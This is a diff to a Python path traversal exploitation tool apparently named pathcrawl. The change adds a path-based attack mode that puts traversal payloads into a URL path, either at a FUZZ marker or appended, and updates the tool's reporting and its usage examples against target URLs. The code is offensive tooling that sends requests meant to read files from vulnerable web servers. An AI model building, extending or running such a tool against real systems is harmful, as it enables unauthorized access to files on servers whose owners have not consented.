@@ -323,10 +323,15 @@ class HitResult:
 
 class PathCrawl:
     def __init__(self, args):
-        self.base_url = args.url
+        self.base_url = args.url.rstrip("/")
         self.param = args.param
         self.method = args.method.upper()
         self.body_param = args.body_param
+        self.path_mode = self.param is None
+        if self.path_mode and "FUZZ" in self.base_url:
+            self.fuzz_marker = True
+        else:
+            self.fuzz_marker = False
         self.headers = self._parse_headers(args.header)
         self.cookies = self._parse_cookies(args.cookie)
         self.proxy = {"http": args.proxy, "https": args.proxy} if args.proxy else None
@@ -381,7 +386,15 @@ class PathCrawl:
     def _send(self, payload):
         """Send a single traversal request and return (status, body)."""
         try:
-            if self.method == "GET":
+            if self.path_mode:
+                if self.fuzz_marker:
+                    url = self.base_url.replace("FUZZ", payload)
+                else:
+                    url = self.base_url + "/" + payload
+                resp = self.session.get(
+                    url, headers=self.headers, timeout=self.timeout, allow_redirects=False
+                )
+            elif self.method == "GET":
                 parsed = urllib.parse.urlparse(self.base_url)
                 qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                 qs[self.param] = [payload]
@@ -628,7 +641,11 @@ class PathCrawl:
         lines.append(bold("=" * 64))
         lines.append("")
         lines.append(f"  Target:    {self.base_url}")
-        lines.append(f"  Parameter: {self.param}")
+        if self.path_mode:
+            mode_str = "FUZZ marker" if self.fuzz_marker else "append to path"
+            lines.append(f"  Mode:      path-based ({mode_str})")
+        else:
+            lines.append(f"  Parameter: {self.param}")
         lines.append(f"  Encoding:  {self.working_encoding}")
         lines.append(f"  Depth:     {self.working_depth}")
         lines.append(f"  Files hit: {len(self.hits)}/{self.tested}")
@@ -671,6 +688,7 @@ class PathCrawl:
         """Generate JSON report."""
         data = {
             "target": self.base_url,
+            "mode": "path" if self.path_mode else "param",
             "parameter": self.param,
             "encoding": self.working_encoding,
             "depth": self.working_depth,
@@ -725,6 +743,11 @@ def main():
         description="pathcrawl — Windows path traversal exploitation tool",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""examples:
+  # Path-based (no parameter, traversal in URL path):
+  %(prog)s -u "http://target/images/"
+  %(prog)s -u "http://target/static/FUZZ" --encoding plain-fwd --depth 8
+
+  # Parameter-based (traversal in query/body param):
   %(prog)s -u "http://target/vuln.asp?file=test" -p file
   %(prog)s -u "http://target/api/read" -p path -m POST --threads 3
   %(prog)s -u "http://target/vuln?f=x" -p f --encoding plain-fwd --depth 6
@@ -733,8 +756,10 @@ def main():
 """
     )
 
-    parser.add_argument("-u", "--url", required=True, help="Target URL with vulnerable parameter")
-    parser.add_argument("-p", "--param", required=True, help="Vulnerable parameter name")
+    parser.add_argument("-u", "--url", required=True,
+                        help="Target URL. Path mode: bare URL or use FUZZ marker. Param mode: use with -p")
+    parser.add_argument("-p", "--param", default=None,
+                        help="Vulnerable parameter name (omit for path-based traversal)")
     parser.add_argument("-m", "--method", default="GET", choices=["GET", "POST"], help="HTTP method (default: GET)")
     parser.add_argument("--body-param", help="Body parameter name if different from -p (POST only)")
     parser.add_argument("-H", "--header", action="append", help="Custom header (e.g. 'Authorization: Bearer xxx')")
